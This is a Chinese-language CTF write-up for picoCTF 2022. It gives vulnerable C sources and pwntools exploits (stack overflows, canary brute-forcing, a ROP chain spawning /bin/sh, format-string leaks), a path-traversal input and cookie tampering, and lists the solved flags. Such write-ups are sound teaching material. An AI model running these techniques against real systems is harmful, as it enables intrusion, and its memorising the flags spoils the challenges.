
picoctf 2022刚刚结束，上面的题目非常适合刚刚入门CTF的选手，整体难度很平易近人，这里写一下picoctf 2022我做过的题的Write-up。当然做的最多的还是pwn。

# 1. pwn部分

pwn部分几乎所有题目都给了源码，算是很亲民了。

## 1. basic-file-exploit

只给了源码：

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>


#define WAIT 60


static const char* flag = "[REDACTED]";

static char data[10][100];
static int input_lengths[10];
static int inputs = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;
    
    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }
    
    
    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set, 
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case. 
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    } 

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


static void data_write() {
  char input[100];
  char len[4];
  long length;
  int r;
  
  printf("Please enter your data:\n");
  r = tgetinput(input, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }
  
  while (true) {
    printf("Please enter the length of your data:\n");
    r = tgetinput(len, 4);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
  
    if ((length = strtol(len, NULL, 10)) == 0) {
      puts("Please put in a valid length");
    } else {
      break;
    }
  }

  if (inputs > 10) {
    inputs = 0;
  }

  strcpy(data[inputs], input);
  input_lengths[inputs] = length;

  printf("Your entry number is: %d\n", inputs + 1);
  inputs++;
}


static void data_read() {
  char entry[4];
  long entry_number;
  char output[100];
  int r;

  memset(output, '\0', 100);
  
  printf("Please enter the entry number of your data:\n");
  r = tgetinput(entry, 4);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }
  
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }

  entry_number--;
  strncpy(output, data[entry_number], input_lengths[entry_number]);
  puts(output);
}


int main(int argc, char** argv) {
  char input[3] = {'\0'};
  long command;
  int r;

  puts("Hi, welcome to my echo chamber!");
  puts("Type '1' to enter a phrase into our database");
  puts("Type '2' to echo a phrase in our database");
  puts("Type '3' to exit the program");

  while (true) {   
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
    
    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
    } else if (command == 1) {
      data_write();
      puts("Write successful, would you like to do anything else?");
    } else if (command == 2) {
      if (inputs == 0) {
        puts("No data yet");
        continue;
      }
      data_read();
      puts("Read successful, would you like to do anything else?");
    } else if (command == 3) {
      return 0;
    } else {
      puts("Please type either 1, 2 or 3");
      puts("Maybe breaking boundaries elsewhere will be helpful");
    }
  }

  return 0;
}
```

只需要写入一次之后读取位置0即可拿到flag。
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_9F68795F}

## 2. buffer overflow 0

源码：
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

注意main函数中的这一条语句``signal(SIGSEGV, sigsegv_handler);``，它表示在程序收到SIGSEGV信号时执行该函数。而这个函数打印flag的值。因此只需要输入使栈溢出即可，输入什么无关紧要。

picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}

## 3. CVE-XXXX-XXXX

查CSDN。

picoCTF{CVE-2021-34527}

## 4. buffer overflow 1

源码：

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

栈溢出到win函数即可。

payload：

```python
# io = process('./vuln')
io = remote('saturn.picoctf.net', 49730)

io.sendlineafter(b'Please enter your string:', cyclic(0x2c) + p32(0x80491f6))

io.interactive()
```
picoCTF{addr3ss3s_ar3_3asy_ad2f467b}

## 5. RPS

一个石头剪刀布游戏。

源码：

```C
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>


#define WAIT 60



static const char* flag = "[REDACTED]";

char* hands[3] = {"rock", "paper", "scissors"};
char* loses[3] = {"paper", "scissors", "rock"};
int wins = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;
    
    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }
    
    
    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set, 
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case. 
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    } 

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


bool play () {
  char player_turn[100];
  srand(time(0));
  int r;

  printf("Please make your selection (rock/paper/scissors):\n");
  r = tgetinput(player_turn, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  int computer_turn = rand() % 3;
  printf("You played: %s\n", player_turn);
  printf("The computer played: %s\n", hands[computer_turn]);

  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
  } else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
  }
}


int main () {
  char input[3] = {'\0'};
  int command;
  int r;

  puts("Welcome challenger to the game of Rock, Paper, Scissors");
  puts("For anyone that beats me 5 times in a row, I will offer up a flag I found");
  puts("Are you ready?");
  
  while (true) {
    puts("Type '1' to play a game");
    puts("Type '2' to exit the program");
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
    
    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
      
    } else if (command == 1) {
      printf("\n\n");
      if (play()) {
        wins++;
      } else {
        wins = 0;
      }

      if (wins >= 5) {
        puts("Congrats, here's the flag!");
        puts(flag);
      }
    } else if (command == 2) {
      return 0;
    } else {
      puts("Please type either 1 or 2");
    }
  }

  return 0;
}
```

注意程序对用户输入的处理方式，是找到用户输入字符串中是否有'rock'，'paper'，'scissors'。也就是说如果输入'rockpaperscissors'就无论如何都能赢。

payload：

```python
from pwn import *
context.log_level='debug'

# io = process('./vuln')
io = remote('saturn.picoctf.net', 51420)

io.sendlineafter(b'Type \'2\' to exit the program', b'1')

for i in range(4):
	io.sendlineafter(b'Please make your selection (rock/paper/scissors):',
		 	b'rockpaperscissors')
	io.sendlineafter(b'Type \'2\' to exit the program', b'1')

io.sendlineafter(b'Please make your selection (rock/paper/scissors):',
		 	b'rockpaperscissors')
io.sendlineafter(b'Type \'2\' to exit the program', b'2')


io.interactive()
```

picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}

## 6. x-sixty-what

源码：
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

64位的栈溢出，前面的是32位的。

payload：

```python
from pwn import *

# io = process('./vuln')
io = remote('saturn.picoctf.net', 49518)

io.sendlineafter(b'Welcome to 64-bit. Give me a string that gets you the flag: ', 
	cyclic(64 + 8) + p64(0x40123B))
	
io.interactive()
```

picoCTF{b1663r_15_b3773r_11c407bc}

## 7. buffer overflow 2

源码：
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

需要传入两个正确的参数，注意一个函数的栈空间从低地址到高地址依次为：变量区、ebp/rbp、返回地址。需要将返回地址覆盖为win函数的起始地址，之后从逻辑上应该是win函数的返回地址，再之后才是win函数的参数。

payload：

```python
from pwn import *

# io = process(b'./vuln')
io = remote('saturn.picoctf.net', 65430)

io.sendlineafter(b'Please enter your string: ', cyclic(112) + p32(0x8049296) + p32(0xDEADBEEF) + p32(0xCAFEF00D) + p32(0xF00DF00D))

io.interactive()
```

picoCTF{argum3nt5_4_d4yZ_b3fd8f66}

## 8. buffer overflow 3

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

加了一个canary，每一次的canary都一样，有read函数可以精确控制写入字节数量，不会多写空字节，因此采用爆破的方式获取canary然后拿到flag。

payload：

```python
from pwn import *
context.log_level='debug'

io = remote('saturn.picoctf.net', 60065)

canary = [0, 0, 0, 0]

def get_payload(i, j):
	ret = cyclic(64)
	for k in range(j):
		ret += p8(canary[k])
	return ret + p8(i)

for j in range(4):
	for i in range(255):
		io.sendlineafter(b'> ', str(65 + j).encode())
		io.sendlineafter(b'Input> ', get_payload(i, j))
		if b'***** Stack Smashing Detected *****' in io.recv():
			io = remote('saturn.picoctf.net', 60065)
		else:
			canary[j] = i
			break
	io = remote('saturn.picoctf.net', 60065)

canary_value = canary[0] + (canary[1] << 8) + (canary[2] << 16) + (canary[3] << 24)
io.sendlineafter(b'> ', str(64 + 4 + 16 + 4).encode())
io.sendlineafter(b'Input> ', cyclic(64) + p32(canary_value) + cyclic(16) + p32(0x8049336))

io.interactive()
```

canary的值为BiRd

picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}

## 9. flag leak

源码：
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```

这是一个格式化字符串漏洞，通过gdb调试发现偏移为24的地方留有flag的地址+4。flag前面4个字符已知，因此直接打印这个地址对应的值即可。

picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}

## 10. ropfu

典型ROP攻击。

源码：

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```

能够在程序中找到大量的rop材料，但还需要一个/bin/sh字符串。需要首先调用库函数将/bin/sh写入bss段，然后再系统调用execve来getshell。具体一些，execve的系统调用需要eax=0xB，ebx=read_addr，ecx=0，edx=0。

payload：
```python
from pwn import *
context.log_level = 'debug'

# io = process('./vuln')
io = remote('saturn.picoctf.net', 53996)
elf = ELF('./vuln')

sh_addr = next(elf.search(b'sh\0'))		# 'sh' addr, need to make ebx point to it
sys_execve = 0xb						# need to make eax be 0xb

pop_eax_addr = 0x80b074a
pop_ebx_addr = 0x8049022
pop_ecx_addr = 0x8049e39
pop_edx_ebx_addr = 0x80583c9
int_80_addr = 0x804a3d2
read_addr = 0x806ecf0
vuln_addr = 0x8049d95
bss_addr = 0x80e62f0

# Step 1: read '/bin/sh' into bss segment and return to vuln() function
payload = cyclic(28)
payload += p32(read_addr) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(100)

io.sendlineafter(b'grasshopper!', payload)

payload = b'/bin/sh\x00'
io.sendline(payload)

# Step 2: use 'int 80' to call SYS_execve, set argument as:
# eax = 0xb
# ebx = '/bin/sh' address
# ecx = edx = 0
payload = cyclic(28)
payload += p32(pop_eax_addr) + p32(0xb)
payload += p32(pop_edx_ebx_addr) + p32(0) + p32(bss_addr)
payload += p32(pop_ecx_addr) + p32(0)
payload += p32(int_80_addr)

io.sendlineafter(b'grasshopper!', payload)

io.interactive()
```

picoCTF{5n47ch_7h3_5h311_e81af635}

# 12. function overwrite

源码：

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}

void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 13371337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
 
int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```

需要将函数指针check从hard_checker改为easy_checker。因为hard_checker会检查输入的story所有字节的ASCII码之和是否为13371337，由于输入长度有限，这显然不可能，而easy_checker则检查和是否为1337，可以实现。后面有一个在指定地址修改值的操作，使用负数绕过检查修改函数指针的值即可。

payload：

```python\
from pwn import *

# io = process('./vuln')
io = remote('saturn.picoctf.net', 54514)

io.sendlineafter(b'Tell me a story and then I\'ll tell you if you\'re a 1337 >> ', b'A' * 20 + b'%')

io.sendlineafter(b'On a totally unrelated note, give me two numbers. Keep the first one less than 10.', b'-16 -314\n')

io.interactive()
```

picoCTF{0v3rwrit1ng_P01nt3rs_529bfb38}

# 2. web 部分

web没有系统学过，但是有的题过于简单，也能做。

## 1. Includes

打开网页直接F12调出源码即可。

picoCTF{1nclu51v17y_1of2_f7w_2of2_df589022}

## 2. Inspect HTML

打开网页直接F12调出HTML即可。

picoCTF{1n5p3t0r_0f_h7ml_1fd8425b}

## 3. Local Authority

先随便输然后提交，报错之后直接F12调出源代码即可获取用户名为admin，密码为strongPassword098765。

picoCTF{j5_15_7r4n5p4r3n7_05df90c8}

## 5. Forbidden Paths

输入../../../../flag.txt即可，会进行读取。

picoCTF{7h3_p47h_70_5ucc355_6db46514}

## 6. Power Cookie

用burpsuite抓包之后把请求里面的isAdmin由0改为1发过去即可。

picoCTF{gr4d3_A_c00k13_5d2505be}

# 3. reverse 部分

会pwn，能看汇编，reverse多少应该也会点吧。

## 1. file-run1

打开IDA直接出flag。

picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b}

## 2. file-run2

同上。

picoCTF{F1r57_4rgum3n7_be0714da}

## 3. GDB Test Drive

main函数如下：

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *s; // [rsp+18h] [rbp-38h]
  char v5[40]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v6; // [rsp+48h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  strcpy(v5, "A:4@r%uL5b3F88bC05C`Gb0`hf4bfg2N");
  sleep(0x186A0u);
  s = (char *)rotate_encrypt(0LL, v5);
  fputs(s, _bss_start);
  putchar(10);
  free(s);
  return 0;
}
```

那个乱码应该是加密之前的字符串，经过rotate_encrypt出flag。

rotate_encrypt函数：

```C
const char *__fastcall rotate_encrypt(__int64 a1, const char *a2)
{
  int v3; // [rsp+14h] [rbp-1Ch]
  size_t i; // [rsp+18h] [rbp-18h]
  const char *v5; // [rsp+20h] [rbp-10h]
  size_t v6; // [rsp+28h] [rbp-8h]

  v5 = strdup(a2);
  v6 = strlen(v5);
  for ( i = 0LL; i < v6; ++i )
  {
    if ( v5[i] > 32 && v5[i] != 127 )
    {
      v3 = v5[i] + 47;
      if ( v3 <= 126 )
        v5[i] = v3;
      else
        v5[i] -= 47;
    }
  }
  return v5;
}
```

加密很简单，每个字节加47如果可打印就是这个，不可打印就在原来字节减47。在main函数里面有一个超长的等待，题目要我们用gdb可能是教我们怎么去跳过一个语句。按着题目的要求来就行了，也可以自己写脚本。

picoCTF{d3bugg3r_dr1v3_197c378a}

## 4. patchme.py

打开patchme.py记下密码，然后运行输进去就行了。实际上加密也不难，可以自己写脚本或者直接给密码输入这个功能删掉直接解密。

ak98-=90adfjhgj321sleuth9000

## 5. Safe Opener

一个java源文件，发现是base64加密，直接拖到在线解密网站去解密。

picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}

## 6. unpackme.py

将执行的代码用对称加密算法fernet算法加密。直接在源码中加一句print即可输出解密结果出flag。

picoCTF{175_chr157m45_5274ff21}

做到这都有点怀疑我到底是不是在做逆向题。

## 7. bloat.py

给所有函数名改了，所有字符串改成索引的形式，但是还是能很快定位密码是happychance。输入之后出flag。

picoCTF{d30bfu5c4710n_f7w_b8062eec}

# 4. Crypto 部分

## 1. basic-mod1

按照题目意思编写脚本即可。
```python
char_list = [54,396,131,198,225,258,87,258,128,211,57,235,114,258,144,220,39,175,330,338,297,288,]
char_dict = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'

flag = ''

for char in char_list:
    ref = char % 37
    flag += char_dict[ref]
   
print(flag)
```

picoCTF{R0UND_N_R0UND_79C18FB3}

## 2. basic-mod2

与上题类似，取逆元用sympy库的方法mod_inverse

picoCTF{1NV3R53LY_H4RD_C680BDC1}

## 3. credstuff

首先根据用户名找到密码：
cvpbPGS{P7e1S_54I35_71Z3}
这显然不是flag，首先猜测为凯撒密码。
位移13求出flag。
picoCTF{C7r1F_54V35_71M3}

## 5. rail-fence

W型的栅栏密码，5列

WH3R3_D035_7H3_F3NC3_8361N_4ND_3ND_4A76B997

## 6. substitution0

一段文字，应该是替换密码。一个一个词判断就行了。

```
EKSZJTCMXOQUDYLFABGPHNRVIW 

Mjbjhfly Ujcbeyz eblgj, rxpm e cbenj eyz gpepjui exb, eyz kblhcmp dj pmj kjjpuj
         Legrand arose, with a gra?e and statel? air, and brought me the beetle
tbld e cuegg segj xy rmxsm xp reg jysulgjz. Xp reg e kjehpxthu gsebekejhg, eyz, ep
from a glass case in which it was enclosed. It was a beautiful scarabaeus, and, at
pmep pxdj, hyqylry pl yephbeuxgpg—lt slhbgj e cbjep fbxwj xy e gsxjypxtxs flxyp
                                                    prize
lt nxjr. Pmjbj rjbj prl blhyz kuesq gflpg yjeb lyj jvpbjdxpi lt pmj kesq, eyz e
of view. There were two ro?n? black ????? near one extremity of
ulyc lyj yjeb pmj lpmjb. Pmj gseujg rjbj jvsjjzxycui mebz eyz culggi, rxpm euu pmj

effjebeysj lt khbyxgmjz cluz. Pmj rjxcmp lt pmj xygjsp reg njbi bjdebqekuj, eyz,

peqxyc euu pmxycg xypl slygxzjbepxly, X slhuz mebzui kuedj Ohfxpjb tlb mxg lfxyxly
                                                           Jupiter
bjgfjspxyc xp.

Pmj tuec xg: fxslSPT{5HK5717H710Y_3N0UH710Y_59533E2J}
             picoCTF{5UB5717U710N_3V0LU710N_59533A2E}
a-q
b-r
c-g
d-m
e-a
f-p
g-s
h-u
i-y
j-e
k-b
l-o
m-h
n-v
o-j
p-t
q-k
r-w
s-c
t-f
u-l
v-x
w-z
x-i
y-n
z-d
```

picoCTF{5UB5717U710N_3V0LU710N_59533A2E}

## 7. substitutuion1

同上，找不到JQXZ对应的字母，但是通过flag可以知道Q对应什么字母。

```
IECj (jqfue cfu ixzelus eqs coxa) xus x emzs fc ifrzlesu jsiludem ifrzsededfy. Ifyesjexyej xus zusjsyesk hdeq x jse fc iqxoosyasj hqdiq esje eqsdu iusxedgdem, esiqydixo (xyk affaodya) jpdooj, xyk zuftosr-jfogdya xtdodem. Iqxoosyasj ljlxoom ifgsu x ylrtsu fc ixesafudsj, xyk hqsy jfogsk, sxiq mdsokj x jeudya (ixoosk x coxa) hqdiq dj jltrdeesk ef xy fyodys jifudya jsugdis. IECj xus x ausxe hxm ef osxuy x hdks xuuxm fc ifrzlesu jsiludem jpdooj dy x jxcs, osaxo sygdufyrsye, xyk xus qfjesk xyk zoxmsk tm rxym jsiludem auflzj xuflyk eqs hfuok cfu cly xyk zuxiedis. Cfu eqdj zuftosr, eqs coxa dj: zdifIEC{CU3NL3YIM_4774IP5_4U3_I001_4871S6CT}
CTFs (short for capture the flag) are a type of computer security competition. contestants are presented with a set of challenges which test their creativity, ????????? (??? ????????) skills, ??? problem-solving ???????. ?????????? ??????? ????? ? ?????? ?? ??????????, ??? ???? ??????, ???? ?????? ? ?????? (?????? ? ????) ????? ?? ????????? ?? ?? ?????? ??????? ???????. ???? ??? ? ????? ??? ?? ????? ? ???? ????? ?? ???????? ???????? ?????? ?? ? ????, ????? ???????????, ??? ??? ?????? ??? ?????? ?? ???? ???????? ?????? ?????? ??? ????? ??? ??? ??? ????????. ??? ???? ???????, ??? ???? ??: picoCTF{???????????????????????????????????}
a b c d e f g h i j k l m n o p q r s t u v w x y z
g ? f i t o v w c s d u y q l k h m e b r ? ? a n p
```

picoCTF{FR3QU3NCY_4774CK5_4R3_C001_4871E6FB}

## 8. substitution2

这次没有分隔符了。但是还是一样。这次用脚本替换。

```
gvjwjjoeugujajwqxzgvjwkjxxjugqfxeuvjivecvumvzzxmzbpsgjwujmswegrmzbpjgegezhuehmxsiehcmrfjwpqgwezgqhi
sumrfjwmvqxxjhcjgvjujmzbpjgegezhunzmsupwebqwexrzhurugjbuqibeheugwqgezhnshiqbjhgqxukvemvqwjajwrsujns
xqhibqwdjgqfxjudexxuvzkjajwkjfjxejajgvjpwzpjwpswpzujznqvecvumvzzxmzbpsgjwujmswegrmzbpjgegezheuhzgzh
xrgzgjqmvaqxsqfxjudexxufsgqxuzgzcjgugsijhguehgjwjugjiehqhijomegjiqfzsgmzbpsgjwumejhmjijnjhueajmzbpj
gegezhuqwjzngjhxqfzwezsuqnnqewuqhimzbjizkhgzwshhehcmvjmdxeuguqhijojmsgehcmzhnecumwepguznnjhujzhgvjz
gvjwvqhieuvjqaexrnzmsujizhjopxzwqgezhqhiebpwzaeuqgezhqhizngjhvqujxjbjhguznpxqrkjfjxejajqmzbpjgegezh
gzsmvehczhgvjznnjhueajjxjbjhguznmzbpsgjwujmswegreugvjwjnzwjqfjggjwajvemxjnzwgjmvjaqhcjxeubgzugsijhg
uehqbjwemqhvecvumvzzxunswgvjwkjfjxejajgvqgqhshijwugqhiehcznznnjhueajgjmvhelsjueujuujhgeqxnzwbzshgeh
cqhjnnjmgeajijnjhujqhigvqggvjgzzxuqhimzhnecswqgezhnzmsujhmzshgjwjiehijnjhueajmzbpjgegezhuizjuhzgxjq
